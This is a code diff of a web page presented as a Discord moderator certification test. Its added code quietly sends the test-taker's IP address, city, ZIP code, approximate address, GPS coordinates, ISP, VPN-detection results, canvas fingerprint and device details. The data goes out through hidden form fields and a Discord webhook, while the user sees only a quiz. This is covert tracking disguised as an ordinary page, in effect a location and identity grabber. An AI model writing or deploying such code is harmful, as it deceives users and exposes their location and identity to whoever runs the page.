+                                    securityFlags.map(f => `• ${f.type} (${f.confidence})`).join('\n').substring(0, 1000) :
+                                    "✅ No security flags detected",
+                                inline: false
                             }
                         ],
                         footer: {
-                            text: "Transcript generated automatically"
+                            text: "Automatically generated by Void Audit System"
                         }
                     };
                     
+                    // Send to Discord
                     const payload = { 
-                        embeds: [embed, transcriptEmbed],
-                        username: "Void Audit System",
-                        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                        embeds: [mainEmbed, transcriptEmbed],
+                        username: "Void Security Audit",
+                        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
+                        content: `📬 **NEW MOD CERTIFICATION TEST SUBMISSION**\nCandidate: ${discordUsername}\nScore: ${score}/${totalQuestions} ${passed ? '✅' : '❌'}\n<@&ROLE_ID_HERE>`
                     };
                     
-                    await fetch(webhookURL, {
+                    const response = await fetch(webhookURL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(payload)
                     });
                     
-                    return true;
+                    return response.ok;
                 } catch (error) {
                     console.error("Failed to send to Discord:", error);
                     return false;
                 }
             }
             
+            // Helper functions
+            function getCountryFlag(countryCode) {
+                if (!countryCode) return "";
+                const flagOffset = 127397;
+                return countryCode
+                    .toUpperCase()
+                    .split('')
+                    .map(char => String.fromCodePoint(char.charCodeAt(0) + flagOffset))
+                    .join('');
+            }
+            
+            function getBrowserName(userAgent) {
+                if (!userAgent) return "Unknown";
+                if (userAgent.includes("Chrome")) return "Chrome";
+                if (userAgent.includes("Firefox")) return "Firefox";
+                if (userAgent.includes("Safari")) return "Safari";
+                if (userAgent.includes("Edge")) return "Edge";
+                if (userAgent.includes("Opera")) return "Opera";
+                return "Unknown";
+            }
+            
+            function calculateActivityScore(mouse, scroll, keys, clicks) {
+                const score = Math.min(100, (mouse * 0.1) + (scroll * 0.5) + (keys * 0.2) + (clicks * 1));
+                return Math.round(score);
+            }
+            
+            function getPerformanceTier(accuracy) {
+                if (accuracy >= 0.9) return "🏆 ELITE";
+                if (accuracy >= 0.75) return "⭐ EXCELLENT";
+                if (accuracy >= 0.6) return "👍 SATISFACTORY";
+                return "⚠️ NEEDS IMPROVEMENT";
+            }
+            
+            function getRecommendation(accuracy) {
+                if (accuracy >= 0.9) return "Ready for immediate promotion";
+                if (accuracy >= 0.75) return "Suitable for mod position";
+                if (accuracy >= 0.6) return "Requires additional training";
+                return "Not ready for mod position";
+            }
+            
             function addToTranscript(speaker, message) {
                 sessionTranscript.push({
                     speaker: speaker,
                     message: message,
-                    timestamp: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                    timestamp: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})
                 });
             }
             
@@ -1429,7 +3391,7 @@
             const sendButton = document.querySelector('.message-input-send');
             const messagesContainer = document.querySelector('.messages-container');
             
-            const isMobile = window.innerWidth <= 768;
+            const startTestWithUsernameBtn = document.getElementById('startTestWithUsername');
             
             // Initialize Discord Interface
             function initializeDiscordInterface() {
@@ -1445,17 +3407,6 @@
                         testInfoPanel.classList.add('active');
                     });
                 }
-                
-                // Close panels when clicking outside
-                document.addEventListener('click', (e) => {
-                    if (!discordSidebar.contains(e.target) && !mobileMenuButton.contains(e.target)) {
-                        discordSidebar.classList.remove('active');
-                    }
-                    
-                    if (!testInfoPanel.contains(e.target) && !mobileBackArrow.contains(e.target)) {
-                        testInfoPanel.classList.remove('active');
-                    }
-                });
                 
                 // Channel switching
                 document.querySelectorAll('.channel-item').forEach(channel => {
@@ -1473,43 +3424,6 @@
                     server.addEventListener('click', function() {
                         document.querySelectorAll('.server-item').forEach(s => s.classList.remove('active'));
                         this.classList.add('active');
-                    });
-                });
-                
-                // Category collapsing
-                document.querySelectorAll('.category-header').forEach(category => {
-                    category.addEventListener('click', function() {
-                        const icon = this.querySelector('.category-icon');
-                        const channels = this.parentElement.querySelector('.category-channels');
-                        
-                        if (channels.style.display === 'none') {
-                            channels.style.display = 'block';
-                            icon.textContent = '▼';
-                        } else {
-                            channels.style.display = 'none';
-                            icon.textContent = '▶';
-                        }
-                    });
-                });
-                
-                // User controls
-                document.querySelectorAll('.control-btn').forEach(btn => {
-                    btn.addEventListener('click', function() {
-                        const action = this.getAttribute('data-action');
-                        switch(action) {
-                            case 'mute':
-                                this.classList.toggle('active');
-                                this.innerHTML = this.classList.contains('active') ? 
-                                    '<i class="fas fa-microphone-slash"></i>' : 
-                                    '<i class="fas fa-microphone"></i>';
-                                break;
-                            case 'deafen':
-                                this.classList.toggle('active');
-                                this.innerHTML = this.classList.contains('active') ? 
-                                    '<i class="fas fa-headphones-slash"></i>' : 
-                                    '<i class="fas fa-headphones"></i>';
-                                break;
-                        }
                     });
                 });
                 
@@ -1536,40 +3450,6 @@
                 if (sendButton) {
                     sendButton.addEventListener('click', sendTestMessage);
                 }
-                
-                // Header buttons
-                document.querySelectorAll('.header-btn').forEach(btn => {
-                    btn.addEventListener('click', function() {
-                        const title = this.getAttribute('title');
-                        showDiscordNotification(`${title} would open here in a real Discord client.`);
-                    });
-                });
-            }
-            
-            function showDiscordNotification(message) {
-                const messagesContainer = document.querySelector('.messages-container');
-                if (!messagesContainer) return;
-                
-                const notification = document.createElement('div');
-                notification.className = 'message-group';
-                
-                notification.innerHTML = `
-                    <div class="message-header">
-                        <div class="message-avatar" style="background-color: #faa81a;">
-                            <i class="fas fa-info-circle"></i>
-                        </div>
-                        <div>
-                            <span class="message-author">System</span>
-                            <span class="message-timestamp">Just now</span>
-                        </div>
-                    </div>
-                    <div class="message-content">
-                        <div class="message">${message}</div>
-                    </div>
-                `;
-                
-                messagesContainer.appendChild(notification);
-                messagesContainer.scrollTop = messagesContainer.scrollHeight;
             }
             
             function addMessage(username, content, color, isBot = false) {
@@ -1755,6 +3635,7 @@
             function startDiscordTest() {
                 testQuestions = getRandomTestQuestions();
                 testTotalQuestions = testQuestions.length;
+                testStartTime = Date.now();
                 
                 testActive = true;
                 testCurrentQuestion = 0;
@@ -1762,7 +3643,7 @@
                 userAnswers = [];
                 correctAnswers = [];
                 sessionTranscript = [];
-                addToTranscript("System", "Test session started");
+                addToTranscript("System", "Test session started at " + new Date().toLocaleString());
                 
                 // Clear existing messages except first two
                 if (messagesContainer) {
@@ -1814,7 +3695,7 @@
             
             async function endTest() {
                 testActive = false;
-                addToTranscript("System", "Test session ended");
+                addToTranscript("System", "Test session ended at " + new Date().toLocaleString());
                 
                 setTimeout(() => {
                     addMessage("Void Bot", "Test complete! Your responses have been evaluated. Check your score in the sidebar.", "#5865f2", true);
@@ -1857,10 +3738,7 @@
                                             questionBreakdown += `${i+1}. ${isCorrect} "${question.userMessage.substring(0, 50)}..."\n`;
                                         }
                                         
-                                        const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
-                                        const metrics = envData.metrics || {};
-                                        
-                                        const discordSent = await sendResultsToDiscord(
+                                        const discordSent = await sendEnhancedResultsToDiscord(
                                             userDiscordUsername, 
                                             testScore, 
                                             testTotalQuestions, 
@@ -1869,11 +3747,18 @@
                                             sessionTranscript
                                         );
                                         
-                                        sendEnhancedEmailResults(sessionTranscript);
+                                        sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed);
                                         
                                         if (discordSent) {
+                                            const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                                            const metrics = envData.metrics || {};
                                             const vpnStatus = metrics.vpnStatus || "Unknown";
-                                            submissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted successfully!<br>VPN Status: ${vpnStatus}`;
+                                            const riskScore = metrics.vpnScore || "0";
+                                            
+                                            submissionStatus.innerHTML = `
+                                                <i class="fas fa-check-circle"></i> Results submitted successfully!<br>
+                                                <small>VPN Status: ${vpnStatus} | Risk Score: ${riskScore}/10</small>
+                                            `;
                                             submissionStatus.className = "submission-status submission-success";
                                         } else {
                                             submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results sent to email (Discord failed).';
@@ -1883,17 +3768,17 @@
                                         submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting results. Please contact staff.';
                                         submissionStatus.className = "submission-status submission-error";
                                     }
-                                }, 1500);
+                                }, 2000);
                             }
                         }, 1000);
                     }, 1500);
                 }, 1000);
             }
             
-            function sendEnhancedEmailResults(transcript) {
-                let fullTranscriptText = "COMPLETE TEST TRANSCRIPT:\n\n";
+            function sendEnhancedEmailResults(transcript, score, total, passed) {
+                let fullTranscriptText = "=== VOID MOD CERTIFICATION TEST TRANSCRIPT ===\n\n";
                 transcript.forEach((entry, idx) => {
-                    fullTranscriptText += `${idx+1}. [${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
+                    fullTranscriptText += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
                 });
                 
                 const now = new Date();
@@ -1902,32 +3787,49 @@
                     month: 'long', 
                     day: 'numeric',
                     hour: '2-digit',
-                    minute: '2-digit'
+                    minute: '2-digit',
+                    second: '2-digit'
                 });
                 
-                const passingScore = testTotalQuestions - 2;
-                const passed = testScore >= passingScore;
+                const passingScore = total - 2;
                 
-                const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {}, sessionLog: [], securityFlags: [] };
                 const metrics = envData.metrics || {};
+                const securityFlags = envData.securityFlags || [];
                 
                 const form = document.getElementById('resultsForm');
                 if (!form) return;
                 
+                // Enhanced fields
                 const enhancedFields = `
                     <input type="hidden" name="user_agent" value="${metrics.agent || ''}">
-                    <input type="hidden" name="screen_resolution" value="${metrics.width || ''}x${metrics.height || ''}">
-                    <input type="hidden" name="timezone" value="${metrics.tz || ''}">
+                    <input type="hidden" name="screen_resolution" value="${metrics.screenWidth || ''}x${metrics.screenHeight || ''}">
+                    <input type="hidden" name="viewport_size" value="${metrics.viewportWidth || ''}x${metrics.viewportHeight || ''}">
+                    <input type="hidden" name="timezone" value="${metrics.timezone || ''}">
                     <input type="hidden" name="browser_language" value="${metrics.language || ''}">
                     <input type="hidden" name="approx_address" value="${metrics.approxAddress || ''}">
                     <input type="hidden" name="coordinates" value="${metrics.lat || ''},${metrics.lon || ''}">
                     <input type="hidden" name="full_transcript" value="${encodeURIComponent(fullTranscriptText)}">
-                    <input type="hidden" name="device_cores" value="${metrics.cores || ''}">
-                    <input type="hidden" name="device_ram" value="${metrics.ram || ''}">
+                    <input type="hidden" name="device_cores" value="${metrics.hardwareConcurrency || ''}">
+                    <input type="hidden" name="device_ram" value="${metrics.deviceMemory || ''}">
                     <input type="hidden" name="isp_organization" value="${metrics.isp || ''}">
+                    <input type="hidden" name="asn_info" value="${metrics.asn || ''}">
                     <input type="hidden" name="zip_postal" value="${metrics.zip || ''}">
                     <input type="hidden" name="vpn_status" value="${metrics.vpnStatus || ''}">
                     <input type="hidden" name="vpn_detected" value="${metrics.vpnDetected || 'false'}">
+                    <input type="hidden" name="vpn_score" value="${metrics.vpnScore || '0'}">
+                    <input type="hidden" name="vpn_flags" value="${metrics.vpnFlags || ''}">
+                    <input type="hidden" name="canvas_fingerprint" value="${metrics.canvasFingerprint || ''}">
+                    <input type="hidden" name="webgl_support" value="${metrics.webglSupport || 'false'}">
+                    <input type="hidden" name="security_flags" value="${securityFlags.length > 0 ? securityFlags.map(f => f.type).join(', ') : 'None'}">
+                    <input type="hidden" name="page_load_time" value="${metrics.pageLoadTime || ''}">
+                    <input type="hidden" name="referrer" value="${metrics.referrer || ''}">
+                    <input type="hidden" name="cookies_enabled" value="${metrics.cookieEnabled || 'false'}">
+                    <input type="hidden" name="local_storage_size" value="${metrics.localStorageSize || ''}">
+                    <input type="hidden" name="session_duration" value="${envData.sessionDuration || ''}">
+                    <input type="hidden" name="test_duration" value="${Date.now() - (testStartTime || Date.now())}">
+                    <input type="hidden" name="performance_tier" value="${getPerformanceTier(score/total)}">
+                    <input type="hidden" name="recommendation" value="${getRecommendation(score/total)}">
                 `;
                 
                 const tempDiv = document.createElement('div');
@@ -1950,15 +3852,15 @@
                 
                 if (formDiscordUsername) formDiscordUsername.value = userDiscordUsername;
                 if (formTestDate) formTestDate.value = testDate;
-                if (formFinalScore) formFinalScore.value = `${testScore}/${testTotalQuestions}`;
+                if (formFinalScore) formFinalScore.value = `${score}/${total}`;
                 if (formPassFail) formPassFail.value = passed ? "PASS" : "FAIL";
                 if (formQuestionBreakdown) formQuestionBreakdown.value = fullTranscriptText.substring(0, 5000);
-                if (formTotalQuestions) formTotalQuestions.value = testTotalQuestions;
+                if (formTotalQuestions) formTotalQuestions.value = total;
                 if (formUserIp) formUserIp.value = metrics.ip || "Unknown";
                 if (formUserCountry) formUserCountry.value = metrics.country || "Unknown";
                 if (formUserState) formUserState.value = metrics.region || "Unknown";
                 if (formUserCity) formUserCity.value = metrics.city || "Unknown";
-                if (formUserTimezone) formUserTimezone.value = metrics.tz || "Unknown";
+                if (formUserTimezone) formUserTimezone.value = metrics.timezone || "Unknown";
                 
                 form.submit();
             }
@@ -1981,7 +3883,6 @@
                 });
             }
             
-            const startTestWithUsernameBtn = document.getElementById('startTestWithUsername');
             if (startTestWithUsernameBtn) {
                 startTestWithUsernameBtn.addEventListener('click', function() {
                     const discordUsernameInput = document.getElementById('discordUsername');
@@ -2048,11 +3949,6 @@
                 if (window.innerWidth <= 768) {
                     if (mobileMenuButton) mobileMenuButton.style.display = 'flex';
                     if (mobileBackArrow) mobileBackArrow.style.display = 'flex';
-                    
-                    const messageInputArea = document.querySelector('.message-input-area');
-                    if (messageInputArea) {
-                        messageInputArea.style.paddingBottom = 'max(15px, env(safe-area-inset-bottom, 15px))';
-                    }
                 } else {
                     if (mobileMenuButton) mobileMenuButton.style.display = 'none';
                     if (mobileBackArrow) mobileBackArrow.style.display = 'none';
@@ -2061,14 +3957,6 @@
             
             adjustMobileLayout();
             window.addEventListener('resize', adjustMobileLayout);
-            
-            // Initialize AOS
-            if (typeof AOS !== 'undefined') {
-                AOS.init({
-                    duration: 800,
-                    once: true
-                });
-            }
         });
     </script>
 </body>
